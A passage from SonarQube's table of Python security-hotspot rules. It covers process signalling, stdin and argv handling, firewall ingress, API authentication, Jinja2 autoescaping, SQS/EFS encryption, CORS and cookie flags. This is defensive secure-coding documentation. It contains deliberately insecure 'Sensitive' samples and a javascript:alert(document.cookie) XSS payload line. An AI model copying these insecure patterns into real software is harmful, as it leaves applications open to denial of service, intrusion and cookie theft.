  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4828">
              python:S4828
            </a>
          </td>
          <td>
            <details>
              <p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>
<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these
parameters may result in a denial of service.</p>
<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect
multiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li>
  <li> This function is triggered by non-administrators. </li>
  <li> Signal handlers on the target processes stop important functions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For stateful applications with user management, ensure that only administrators trigger this code. </li>
  <li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li>
  <li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li>
  <li> Isolate the process on the system based on its (E)UID. </li>
  <li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import os

@app.route("/kill-pid/&lt;pid&gt;")
def send_signal(pid):
    os.kill(pid, 9)  # Sensitive

@app.route("/kill-pgid/&lt;pgid&gt;")
def send_signal(pgid):
    os.killpg(pgid, 9)  # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import os

@app.route("/kill-pid/&lt;pid&gt;")
def send_signal(pid):
    # Validate the untrusted PID,
    # With a pre-approved list or authorization checks
    if is_valid_pid(pid):
        os.kill(pid, 9)

@app.route("/kill-pgid/&lt;pgid&gt;")
def send_signal(pgid):
    # Validate the untrusted PGID,
    # With a pre-approved list or authorization checks
    if is_valid_pgid(pgid):
        os.kill(pgid, 9)
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/283">CWE-283 - Unverified Ownership</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man1/kill.1.html">kill(1) — Linux manual page</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/kill.2.html">kill(2) — Linux manual page</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4829">
              python:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337">CVE-2005-2337</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<p>Python 2 and Python 3</p>
<pre>
import sys
from sys import stdin, __stdin__

# Any reference to sys.stdin or sys.__stdin__ without a method call is Sensitive
sys.stdin  # Sensitive

for line in sys.stdin:  # Sensitive
    print(line)

it = iter(sys.stdin)  # Sensitive
line = next(it)

# Calling the following methods on stdin or __stdin__ is sensitive
sys.stdin.read()  # Sensitive
sys.stdin.readline()  # Sensitive
sys.stdin.readlines()  # Sensitive

# Calling other methods on stdin or __stdin__ does not require a review, thus it is not Sensitive
sys.stdin.seekable()  # Ok
# ...
</pre>
<p>Python 2 only</p>
<pre>
raw_input('What is your password?')  # Sensitive
</pre>
<p>Python 3 only</p>
<pre>
input('What is your password?')  # Sensitive
</pre>
<p>Function <code>fileinput.input</code> and class <code>fileinput.FileInput</code> read the standard input when the list of files is empty.</p>
<pre>
for line in fileinput.input():  # Sensitive
    print(line)

for line in fileinput.FileInput():  # Sensitive
    print(line)

for line in fileinput.input(['setup.py']):  # Ok
    print(line)

for line in fileinput.FileInput(['setup.py']):  # Ok
    print(line)
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4823">
              python:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281">CVE-2018-7281</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326">CVE-2018-12326</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue on every reference to <code>sys.argv</code>, call to <code>optparse.OptionParser()</code> or a call to
<code>argparse.ArgumentParser()</code>. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/214">CWE-214 - Information Exposure Through Process Environment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6321">
              python:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html">aws_cdk.aws_ec2.Instance</a> and other constructs that
support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

instance = ec2.Instance(
    self,
    "my_instance",
    instance_type=nano_t2,
    machine_image=ec2.MachineImage.latest_amazon_linux(),
    vpc=vpc
)

instance.connections.allow_from(
    ec2.Peer.any_ipv4(), # Noncompliant
    ec2.Port.tcp(22),
    description="Allows SSH from all IPv4"
)
instance.connections.allow_from_any_ipv4( # Noncompliant
    ec2.Port.tcp(3389),
    description="Allows Terminal Server from all IPv4"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html">aws_cdk.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2
security_group = ec2.SecurityGroup(
    self,
    "custom-security-group",
    vpc=vpc
)

security_group.add_ingress_rule(
    ec2.Peer.any_ipv4(), # Noncompliant
    ec2.Port.tcp_range(1, 1024)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroup(
    self,
    "cfn-based-security-group",
    group_description="cfn based security group",
    group_name="cfn-based-security-group",
    vpc_id=vpc.vpc_id,
    security_group_ingress=[
        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant
            ip_protocol="6",
            cidr_ip="0.0.0.0/0",
            from_port=22,
            to_port=22
        ),
        ec2.CfnSecurityGroup.IngressProperty( # Noncompliant
            ip_protocol="tcp",
            cidr_ip="0.0.0.0/0",
            from_port=3389,
            to_port=3389
        ),
        { # Noncompliant
            "ipProtocol":"-1",
            "cidrIpv6":"::/0"
        }
    ]
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="noncompliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroupIngress( # Noncompliant
    self,
    "ingress-all-ip-tcp-ssh",
    ip_protocol="tcp",
    cidr_ip="0.0.0.0/0",
    from_port=22,
    to_port=22,
    group_id=security_group.attr_group_id
)

ec2.CfnSecurityGroupIngress( # Noncompliant
    self,
    "ingress-all-ipv6-all-tcp",
    ip_protocol="-1",
    cidr_ipv6="::/0",
    group_id=security_group.attr_group_id
)
</pre>
<h4>Compliant solution</h4>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html">aws_cdk.aws_ec2.Instance</a> and other constructs that
support a <code>connections</code> attribute:</p>
<pre data-diff-id="1" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

instance = ec2.Instance(
    self,
    "my_instance",
    instance_type=nano_t2,
    machine_image=ec2.MachineImage.latest_amazon_linux(),
    vpc=vpc
)

instance.connections.allow_from_any_ipv4(
    ec2.Port.tcp(1234),
    description="Allows 1234 from all IPv4"
)

instance.connections.allow_from(
    ec2.Peer.ipv4("192.0.2.0/24"),
    ec2.Port.tcp(22),
    description="Allows SSH from all IPv4"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/SecurityGroup.html">aws_cdk.aws_ec2.SecurityGroup</a></p>
<pre data-diff-id="2" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2
security_group = ec2.SecurityGroup(
    self,
    "custom-security-group",
    vpc=vpc
)

security_group.add_ingress_rule(
    ec2.Peer.any_ipv4(),
    ec2.Port.tcp_range(1024, 1048)
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroup.html">aws_cdk.aws_ec2.CfnSecurityGroup</a></p>
<pre data-diff-id="3" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroup(
    self,
    "cfn-based-security-group",
    group_description="cfn based security group",
    group_name="cfn-based-security-group",
    vpc_id=vpc.vpc_id,
    security_group_ingress=[
        ec2.CfnSecurityGroup.IngressProperty(
            ip_protocol="tcp",
            cidr_ip="0.0.0.0/0",
            from_port=1024,
            to_port=1048
        ),
        {
            "ipProtocol":"6",
            "cidrIp":"192.0.2.0/24",
            "fromPort":22,
            "toPort":22
        }
    ]
)
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnSecurityGroupIngress.html">aws_cdk.aws_ec2.CfnSecurityGroupIngress</a></p>
<pre data-diff-id="4" data-diff-type="compliant">
from aws_cdk import aws_ec2 as ec2

ec2.CfnSecurityGroupIngress(
    self,
    "ingress-all-ipv4-tcp-http",
    ip_protocol="6",
    cidr_ip="0.0.0.0/0",
    from_port=80,
    to_port=80,
    group_id=security_group.attr_group_id
)

ec2.CfnSecurityGroupIngress(
    self,
    "ingress-range-tcp-rdp",
    ip_protocol="tcp",
    cidr_ip="192.0.2.0/24",
    from_port=3389,
    to_port=3389,
    group_id=security_group.attr_group_id
)
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6333">
              python:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul>
  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>
  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>
  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html">aws_cdk.aws_apigateway.Resource</a>:</p>
<pre>
from aws_cdk import (
    aws_apigateway as apigateway
)

resource = api.root.add_resource("example")
resource.add_method(
    "GET",
    authorization_type=apigateway.AuthorizationType.NONE  # Sensitive
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
from aws_cdk import (
    aws_apigatewayv2 as apigateway
)

apigateway.CfnRoute(
    self,
    "no-auth",
    api_id=api.ref,
    route_key="GET /test",
    authorization_type="NONE"  # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_apigateway/Resource.html">aws_cdk.aws_apigateway.Resource</a>:</p>
<pre>
from aws_cdk import (
    aws_apigateway as apigateway
)

opts = apigateway.MethodOptions(
    authorization_type=apigateway.AuthorizationType.IAM
)
resource = api.root.add_resource(
    "example",
    default_method_options=opts
)
resource.add_method(
    "POST",
    authorization_type=apigateway.AuthorizationType.IAM
)
resource.add_method(  # authorization_type is inherited from the Resource's configured default_method_options
    "POST"
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_apigatewayv2.CfnRoute.html">aws_cdk.aws_apigatewayv2.CfnRoute</a>:</p>
<pre>
from aws_cdk import (
    aws_apigatewayv2 as apigateway
)

apigateway.CfnRoute(
    self,
    "auth",
    api_id=api.ref,
    route_key="GET /test",
    authorization_type="AWS_IAM"
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5247">
              python:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because '<code>:</code>' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<pre>
from jinja2 import Environment

env = Environment() # Sensitive: New Jinja2 Environment has autoescape set to false
env = Environment(autoescape=False) # Sensitive:
</pre>
<h2>Compliant Solution</h2>
<pre>
from jinja2 import Environment
env = Environment(autoescape=True) # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6330">
              python:S6330
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Queue Service (SQS) is a managed message queuing service for application-to-application (A2A) communication. Amazon SQS can store
messages encrypted as soon as they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message
from the file system, for example through a vulnerability in the service, they are not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The queue contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SQS queues that contain sensitive information. Encryption and decryption are handled transparently by SQS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html">aws_cdk.aws_sqs.Queue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class QueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.Queue( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html">aws_cdk.aws_sqs.CfnQueue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class CfnQueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.CfnQueue( # Sensitive, unencrypted by default
            self,
            "example"
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.Queue.html">aws_cdk.aws_sqs.Queue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class QueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sqs.Queue(
            self,
            "example",
            encryption=sqs.QueueEncryption.KMS_MANAGED
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sqs.CfnQueue.html">aws_cdk.aws_sqs.CfnQueue</a>:</p>
<pre>
from aws_cdk import (
    aws_sqs as sqs
)

class CfnQueueStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key = kms.Key(self, "key")
        sqs.CfnQueue(
            self,
            "example",
            kms_master_key_id=my_key.key_id
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-server-side-encryption.html">AWS Documentation</a> -
  Encryption at rest </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6332">
              python:S6332
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elastic File System (EFS) is a serverless file system that does not require provisioning or managing storage. Stored files can be
automatically encrypted by the service. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are
not able to access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file system contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html">aws_cdk.aws_efs.FileSystem</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html">aws_cdk.aws_efs.CfnFileSystem</a>:</p>
<pre>
from aws_cdk import (
    aws_efs as efs
)

efs.FileSystem(
    self,
    "example",
    encrypted=False  # Sensitive
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.FileSystem.html">aws_cdk.aws_efs.FileSystem</a> and <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html">aws_cdk.aws_efs.CfnFileSystem</a>:</p>
<pre>
from aws_cdk import (
    aws_efs as efs
)

efs.FileSystem(
    self,
    "example",
    encrypted=True
)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html">AWS Documentation</a> - Data encryption in Amazon EFS </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5122">
              python:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Django:</p>
<pre>
CORS_ORIGIN_ALLOW_ALL = True # Sensitive
</pre>
<p>Flask:</p>
<pre>
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*", "send_wildcard": "True"}}) # Sensitive
</pre>
<p>User-controlled origin:</p>
<pre>
origin = request.headers['ORIGIN']
resp = Response()
resp.headers['Access-Control-Allow-Origin'] = origin # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Django:</p>
<pre>
CORS_ORIGIN_ALLOW_ALL = False # Compliant
</pre>
<p>Flask:</p>
<pre>
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*", "send_wildcard": "False"}}) # Compliant
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
origin = request.headers['ORIGIN']
resp = Response()
if origin in TRUSTED_ORIGINS:
   resp.headers['Access-Control-Allow-Origin'] = origin
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/346">CWE-346 - Origin Validation Error</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/942">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2092">
              python:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">mixed content</a> or not
  (ie HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
